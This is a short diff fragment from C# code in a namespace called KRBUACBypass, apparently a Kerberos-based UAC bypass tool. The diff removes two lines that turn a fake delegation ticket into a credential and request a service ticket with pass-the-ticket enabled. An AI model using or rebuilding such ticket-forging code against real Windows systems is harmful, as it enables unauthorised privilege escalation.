@@ -61,8 +61,6 @@ namespace KRBUACBypass
             bool ptt = true;
 
             byte[] blah = LSA.RequestFakeDelegTicket();
-            KRB_CRED kirbi = new KRB_CRED(blah);
-            Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);
         }
     }
 }
